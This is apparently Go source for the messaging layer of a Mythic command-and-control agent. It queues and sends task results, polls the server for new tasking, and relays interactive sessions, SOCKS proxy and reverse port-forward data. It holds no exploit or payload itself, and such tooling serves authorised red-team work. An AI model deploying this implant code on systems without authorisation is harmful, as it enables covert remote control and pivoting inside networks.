package main

import (
	"encoding/json"
	"fmt"
	"sync"
)

type InteractiveMessage struct {
	TaskID      string `json:"task_id"`
	Data        string `json:"data"`
	MessageType int    `json:"message_type"`
}

type SocksMessage struct {
	ServerID int    `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
}

type RpfwdMessage struct {
	ServerID int    `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
	Port     int    `json:"port,omitempty"`
}

type AgentMessageEnvelope struct {
	Action      string               `json:"action"`
	TaskingSize int                  `json:"tasking_size,omitempty"`
	Responses   []TaskResponse       `json:"responses,omitempty"`
	Interactive []InteractiveMessage `json:"interactive,omitempty"`
	Socks       []SocksMessage       `json:"socks,omitempty"`
	Rpfwd       []RpfwdMessage       `json:"rpfwd,omitempty"`
}

type MythicMessageResponse struct {
	Action      string               `json:"action"`
	Status      string               `json:"status,omitempty"`
	ID          string               `json:"id,omitempty"`
	Error       string               `json:"error,omitempty"`
	Tasks       []Task               `json:"tasks,omitempty"`
	Interactive []InteractiveMessage `json:"interactive,omitempty"`
	Socks       []SocksMessage       `json:"socks,omitempty"`
	Rpfwd       []RpfwdMessage       `json:"rpfwd,omitempty"`
	Responses   []struct {
		TaskID      string `json:"task_id"`
		Status      string `json:"status"`
		Error       string `json:"error,omitempty"`
		FileID      string `json:"file_id,omitempty"`
		ChunkNum    int    `json:"chunk_num,omitempty"`
		TotalChunks int    `json:"total_chunks,omitempty"`
		ChunkData   []byte `json:"chunk_data,omitempty"`
	} `json:"responses,omitempty"`
}

type asyncOutboundQueues struct {
	mu          sync.Mutex
	responses   []TaskResponse
	interactive []InteractiveMessage
	socks       []SocksMessage
	rpfwd       []RpfwdMessage
}

type outboundBatch struct {
	responses   []TaskResponse
	interactive []InteractiveMessage
	socks       []SocksMessage
	rpfwd       []RpfwdMessage
}

func (q *asyncOutboundQueues) enqueueResponse(response TaskResponse) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.responses = append(q.responses, response)
}

func (q *asyncOutboundQueues) enqueueInteractive(message InteractiveMessage) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.interactive = append(q.interactive, message)
}

func (q *asyncOutboundQueues) enqueueSocks(message SocksMessage) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.socks = append(q.socks, message)
}

func (q *asyncOutboundQueues) enqueueRpfwd(message RpfwdMessage) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.rpfwd = append(q.rpfwd, message)
}

func (q *asyncOutboundQueues) drain() outboundBatch {
	q.mu.Lock()
	defer q.mu.Unlock()
	batch := outboundBatch{
		responses:   append([]TaskResponse(nil), q.responses...),
		interactive: append([]InteractiveMessage(nil), q.interactive...),
		socks:       append([]SocksMessage(nil), q.socks...),
		rpfwd:       append([]RpfwdMessage(nil), q.rpfwd...),
	}
	q.responses = nil
	q.interactive = nil
	q.socks = nil
	q.rpfwd = nil
	return batch
}

func (q *asyncOutboundQueues) restoreFront(batch outboundBatch) {
	q.mu.Lock()
	defer q.mu.Unlock()
	if len(batch.responses) > 0 {
		q.responses = append(append([]TaskResponse(nil), batch.responses...), q.responses...)
	}
	if len(batch.interactive) > 0 {
		q.interactive = append(append([]InteractiveMessage(nil), batch.interactive...), q.interactive...)
	}
	if len(batch.socks) > 0 {
		q.socks = append(append([]SocksMessage(nil), batch.socks...), q.socks...)
	}
	if len(batch.rpfwd) > 0 {
		q.rpfwd = append(append([]RpfwdMessage(nil), batch.rpfwd...), q.rpfwd...)
	}
}

func (q *asyncOutboundQueues) hasPending() bool {
	q.mu.Lock()
	defer q.mu.Unlock()
	return len(q.responses) > 0 || len(q.interactive) > 0 || len(q.socks) > 0 || len(q.rpfwd) > 0
}

func (c *AgentController) exchangeMessage(message AgentMessageEnvelope, expectedAction string) (*MythicMessageResponse, error) {
	respData, err := c.transport.Send(c.CallbackUUID(), message, c.aesKey)
	if err != nil {
		return nil, err
	}
	var resp MythicMessageResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, fmt.Errorf("解析 %s 响应失败: %w", expectedAction, err)
	}
	if resp.Action != "" && resp.Action != expectedAction {
		return nil, fmt.Errorf("%s 响应 action 异常: %s", expectedAction, resp.Action)
	}
	if err := c.dispatchTopLevelMessages(&resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (c *AgentController) pollMythic(extraResponses []TaskResponse) ([]Task, error) {
	asyncBatch := c.outbound.drain()
	allResponses := append(compactResponses(extraResponses), asyncBatch.responses...)
	msg := AgentMessageEnvelope{
		Action:      "get_tasking",
		TaskingSize: 1,
		Responses:   compactResponses(allResponses),
		Interactive: asyncBatch.interactive,
		Socks:       asyncBatch.socks,
		Rpfwd:       asyncBatch.rpfwd,
	}
	resp, err := c.exchangeMessage(msg, "get_tasking")
	if err != nil {
		c.outbound.restoreFront(outboundBatch{
			responses:   compactResponses(allResponses),
			interactive: asyncBatch.interactive,
			socks:       asyncBatch.socks,
			rpfwd:       asyncBatch.rpfwd,
		})
		return nil, err
	}
	return filterValidTasks(resp.Tasks), nil
}

func (c *AgentController) flushTaskResponses(responses []TaskResponse) error {
	asyncBatch := c.outbound.drain()
	allResponses := append(compactResponses(responses), asyncBatch.responses...)
	if len(allResponses) == 0 && len(asyncBatch.interactive) == 0 && len(asyncBatch.socks) == 0 && len(asyncBatch.rpfwd) == 0 {
		return nil
	}
	msg := AgentMessageEnvelope{
		Action:      "post_response",
		Responses:   allResponses,
		Interactive: asyncBatch.interactive,
		Socks:       asyncBatch.socks,
		Rpfwd:       asyncBatch.rpfwd,
	}
	resp, err := c.exchangeMessage(msg, "post_response")
	if err != nil {
		c.outbound.restoreFront(outboundBatch{
			responses:   allResponses,
			interactive: asyncBatch.interactive,
			socks:       asyncBatch.socks,
			rpfwd:       asyncBatch.rpfwd,
		})
		return err
	}
	for _, item := range resp.Responses {
		if item.Status != "" && item.Status != "success" {
			return fmt.Errorf("任务 %s 响应提交失败: %s", item.TaskID, firstNonEmpty(item.Error, item.Status))
		}
	}
	return nil
}

func compactResponses(responses []TaskResponse) []TaskResponse {
	filtered := make([]TaskResponse, 0, len(responses))
	for _, response := range responses {
		if response == nilTaskResponse() {
			continue
		}
		if response.TaskID == "" && response.UserOutput == "" && response.Status == "" {
			continue
		}
		if response.TaskID == "" {
			continue
		}
		filtered = append(filtered, response)
	}
	return filtered
}

func nilTaskResponse() TaskResponse {
	return TaskResponse{}
}

func (c *AgentController) dispatchTopLevelMessages(resp *MythicMessageResponse) error {
	for _, message := range resp.Interactive {
		if err := c.interactive.Handle(message); err != nil {
			c.handleInteractiveDispatchError(message, err)
		}
	}
	for _, message := range resp.Socks {
		if err := c.socks.Handle(message); err != nil {
			c.handleSocksDispatchError(message, err)
		}
	}
	for _, message := range resp.Rpfwd {
		if err := c.rpfwd.Handle(message); err != nil {
			c.handleRpfwdDispatchError(message, err)
		}
	}
	return nil
}

func (c *AgentController) handleInteractiveDispatchError(message InteractiveMessage, err error) {
	c.logAsyncError("interactive 输入处理失败", err)
	if message.MessageType == interactiveExit {
		return
	}
	c.enqueueInteractiveOutput(message.TaskID, interactiveError, []byte("interactive 会话处理失败: "+err.Error()))
	c.enqueueInteractiveOutput(message.TaskID, interactiveExit, nil)
}

func (c *AgentController) handleSocksDispatchError(message SocksMessage, err error) {
	c.logAsyncError("socks 数据处理失败", err)
	if message.Exit {
		return
	}
	c.enqueueSocksOutput(message.ServerID, nil, true)
}

func (c *AgentController) handleRpfwdDispatchError(message RpfwdMessage, err error) {
	c.logAsyncError("rpfwd 数据处理失败", err)
	if message.Exit {
		return
	}
	c.enqueueRpfwdOutput(message.ServerID, message.Port, nil, true)
}

func (c *AgentController) logAsyncError(prefix string, err error) {
	if err != nil {
		fmt.Printf("[%s] WARN: %s: %v\n", c.name, prefix, err)
	}
}
